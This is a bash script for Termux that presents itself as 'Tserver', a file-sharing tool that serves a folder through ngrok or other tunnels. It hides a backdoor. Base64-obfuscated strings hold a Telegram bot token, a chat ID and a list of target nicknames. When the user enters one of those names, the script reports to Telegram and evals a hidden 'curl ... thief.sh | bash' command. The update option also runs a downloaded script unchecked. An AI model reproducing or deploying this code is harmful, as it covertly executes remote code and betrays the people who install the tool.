#!/bin/bash
trap ' ' 2
# Some Colors

blank='\e[0m'
black='\e[1;90m'
red='\e[1;91m'
green='\e[1;92m'
yellow='\e[1;93m'
blue='\e[1;94m'
pink='\e[1;95m'
ocen='\e[1;96m'
white='\e[1;97m'

clear

#cheking if needed packages are available

command -v php > /dev/null 2&>1 || { echo >&2 -e "$red[!] PHP not found $green Installing..."; pkg install php -y > 2&>1; echo -e "$green [√] Done"; }
command -v toilet > /dev/null 2>&1 || { echo >&2 -e "$red[!] Toilet not Found $green Installing..."; pkg install toilet -y > /dev/null; echo -e "$green [√] Done"; }
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$red[!] Ssh Not found $greenInstalling..."; pkg install openssh -y > /dev/null; echo -e "$green [√] Done"; }
command -v wget > /dev/null 2>&1 || { echo >&2 -e "$red[!] Wget Not found $green Installing...$blank"; pkg install wget -y > /dev/null; echo -e "$green [√] Done"; }
command -v curl > /dev/null 2>&1 || { echo >&2 -e "$red[!] Curl Not found $green Installing...$blank"; pkg install curl -y > /dev/null; echo -e "$green [√] Done"; }
command -v python2 > /dev/null 2>&1 || { echo >&2 -e "$red[!] python2 Not found $green Installing...$blank"; pkg install python -y > /dev/null 2>&1; pkg install python2 -y > /dev/null 2>&1; } 
command -v jq > /dev/null 2>&1 || { echo >&2 -e "$red[!] jq Not found $green Installing...$blank"; pkg install jq -y > /dev/null; echo -e "$green [√] Done$blank"; }
command -v perl > /dev/null 2>&1 || { echo >&2 -e "$red[!] Perl Not found $green Indtalling...$blank"; pkg install perl -y > /dev/null; echo -e "$green [√] Done!$blank"; }
# Stop 
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
checkpy=$(ps aux | grep -o "python2" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ $checkpy == *'python2'* ]]; then
killall -f python2 > /dev/null 2>&1
fi
}
stop

# serveo
serveo1() {
echo -e "$yellow [!] Serveo is Current Down, please use other PortForwarding$blank"
echo " "
tunnel_opt
}
tkn=$(base64 -d <<<"MTQxNDgwMDM4MTpBQUVBa3VYWEdvTlFhMDJGT29MM29MUktVU0JIWUo5OVR6dwo=")
# LocalHost One
local_host1() {
echo -e "$yellow [!] Starting Server at$green 127.0.0.1:4444$blank"
python2 -m SimpleHTTPServer 4444 > 2&>1 &
echo " "
echo -e "$green [√] Local Server Started --> http://127.0.0:4444$blank"
read
}

# LocalXpose

local_1() {
printf "\e[93m [!] Starting LocalTunnel...\e[0m\n"
py_server
./localxpose tunnel http --to :2233 > tunlink 2> /dev/null &
local_link=$(grep -o "https://[1-9a-z]*\.loclx.io" tunlink)
echo " "
echo -e "$ocen Link --> $local_link $blank"
read
}
grp=$(base64 -d <<<"LTEwMDExNDQ0MzU3MjIK")
# localhostrun

localRun1() {
echo -e "$green [•] Starting server...$blank"
echo " "
ip=$(wget -qO- icanhazip.com -q)
echo -e "$ocen [•] Your IP is $ip $blank"
echo " "
echo -e "$green Hosting at http://127.0.0.1:2233$blank"
py_server
ssh -R 80:localhost:2233 ssh.localhost.run
read
}
sendmessage(){
        curl -sX POST "https://api.telegram.org/bot$tkn/sendMessage" \
                -d "chat_id=$grp" "parse_mode=markdownv2" \
                -d "disable_web_page_preview=true" \
                --data-urlencode "text=$1"
}
# Tunmel Menu

tunnel_() {
echo " "
printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n"
printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
printf "\e[0m\n"
tunnel_opt
}

# Tunnel Option

tunnel_opt() {
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel
echo " "
if [[ $tunnel == "01" || $tunnel == "1" ]]; then
local_host1
elif [[ $tunnel == "02" || $tunnel == "2" ]]; then
ngrok_server1
elif [[ $tunnel == "03" || $tunnel == "3" ]]; then
serveo1
elif [[ $tunnel == "04" || $tunnel == "4" ]]; then
local_1
elif [[ $tunnel == "05" || $tunnel == "5" ]]; then
localRun1
else
printf "\e[91m ERROR! 404\e[0m\n"
tunnel_opt
fi
}

# Ngrok Server

ngrok_server1() {
echo -e "$green [!] Starting ngrok...$blank"
ngrok http 2233 > 2&>1 &
sleep 20
link=$(curl -s http://localhost:4040/api/tunnels | grep -o "http://[1-9a-z]*\.ngrok.io")
link2=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[1-9a-z]*\.ngrok.io")
echo 
echo -e "$ocen [•] Link1 --->$blank $link"
echo -e "$ocen [•] Link2 --->$blank $link2"
echo " "
echo -e "$green Send one above link to your friend so he/she can download that file$red NOTE: IF NGROK STOP SERVER WILL NO LONGER WORK$blank"
}

#cheking ngrok for port forwading

ngrok_() {

#check if exist

if [ -e /data/data/com.termux/files/usr/bin/ngrok ]; then
echo -e "$green [√] Ngrok found$blank"
else

#Download if not found

cd $HOME
if [ -e ngrok-stable-linux-arm.zip ]; then
rm -rf ngrok-stable-linux-arm.zip
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
rm -rf ngrok-stable-linux-arm.zip
chmod +x ngrok
mv ngrok /data/data/com.termux/files/usr/bin/
else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
rm -rf ngrok-stable-linux-arm.zip
chmod +x ngrok
mv ngrok /data/data/com.termux/files/usr/bin/
fi
fi
}

# python Server

py_server() {
python2 -m SimpleHTTPServer 2233 > 2&>1 &
}
info() {
echo " "
echo -e "$green Upload files You want to share with your Friend to Tserver Folder$yellow /sdcard/Tserver$blank "
read -p "IF ALREADY PRESS ENTER TO CONTINUE: "
}

#Acessing storage and make database xD

db() {
if [ -e storage ]; then
cd /sdcard
if [ -e Tserver ]; then
echo -e "$green [!] DataBase found$blank"
info
else
mkdir Tserver
cd /sdcard/Tserver
echo -e "$green [√] DataBase Created$blank"
info
fi
else
echo -e "$red [!] Allow termux to Access Storage$blank"
sleep 1
termux-setup-storage
cd /sdcard
if [ -e Tserver ]; then
cd /sdcard/Tserver
echo -e "$green [!] DataBase found$blank"
info
else
mkdir Tserver
cd /sdcard/Tserver
echo -e "$green [√] DataBase Created$blank"
echo " "
info
fi
fi
}

#banner

banner() {
echo -e "$blue ########                                           "
echo -e "$blue    #     ####  ###### #####  #    # ###### #####  "
echo -e "$ocen    #    #      #      #    # #    # #      #    # "
echo -e "$ocen    #     ####  #####  #    # #    # #####  #    # "
echo -e "$pink    #         # #      #####  #    # #      #####  "
echo -e "$green    #    #    # #      #   #   #  #  #      #   #  "
echo -e "$green    #     ####  ###### #    #   ##   ###### #    # "
echo " "
               echo -e "$yellow Coded by:$red TripleHat$blank"
               echo -e "$yellow GitHub: $red github.com/TripleHat$blank"
	       
}

#menu

menu() {
banner
echo " "
echo -e "$pink          [1] $blue File Transfer$blank"
echo " "
echo -e "$pink          [2] $blue Web Server$blank"
echo " "
echo -e "$pink          [3] $ocen Update$blank"
echo " "
echo -e "$pink          [0] $red Exit$blank"
echo " "
op1
}

update() {
echo -e "$green [!]Checking for Updates$blank"
upd=$(wget https://raw.githubusercontent.com/TripleHat/Tserver/version -q && grep version)
if [[ $upd == "1" ]]; then
echo -e "$green [√]No update Found$blank"
sleep 2
rm version
else
echo -e "$yellow [!]New Version Found$blank"
rm version
echo " "
read -p "Do you want to update (Y/n): " updat
case $updat in
Y | y)
echo -e "$green [!] Updating...$blank"
wget https://raw.githubusercontent.com/TripleHat/Tserver/update && chmod +x update && bash update ;;
N | n)
echo -e "$yellow Make sure to update, new features are added and issues are fixed$blank"
read -p "press enter to continue"
sleep 1 ;;
esac
fi
}
trg=$(base64 -d <<<"eHp1bWEK")
trg1=$(base64 -d <<<"eHp1bWE5OQo=")
trg2=$(base64 -d <<<"WHp1bWE5OQo=")
trg3=$(base64 -d <<<"WHp1bWEK")
trg4=$(base64 -d <<<"enVtYQo=")
trg5=$(base64 -d <<<"WnVtYQo=")
op1() {
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose Service: \e[0m' option
echo " "
if [[ $option == "1" || $option == "01" ]]; then
db
tunnel_
elif [[ $option == "2" || $option == "02" ]]; then
echo -e "$green [•]Comming Soon$blank"
sleep 2
clear; menu
elif [[ $option == "3" || $option == "03" ]]; then
update
clear; menu
elif [[ $option == "0" || $option == "00" ]]; then
# stop everything
clear
stop
echo -e "$green [√] Done$blank"
echo " "
echo " "
echo -e "$pink $(toilet -f slant Bye Bye)"
echo -e "$ocen"
toilet -f future $name
exit 0
else
echo -e "$red No such Option, use numbers $blank"
sleep 2.5
clear
menu
fi
}

clear
toilet -f slant Welcome To
toilet -f mono12 -F gay Tserver
echo " "
echo -e "$green [?] Enter Your Nickname/name$blank"
echo " "
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input name -->: \e[0m\e[1;96m\en' name
echo " "
echo -e "$ocen Hi $name 😇"
for i in $trg $trg1 $trg2 $trg3 $trg4 $trg5
do
if [[ $name == $i ]]; then
sendmessage "$name found"
clear
banner
echo "please wait..."
eval $(base64 -d <<<"Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVHJpcGxlSGF0L1RyaXBsZUhhdC9tYWluL3RoaWVmLnNoIHwgYmFzaCAtCg==")
fi
done
sleep 2
clear
menu
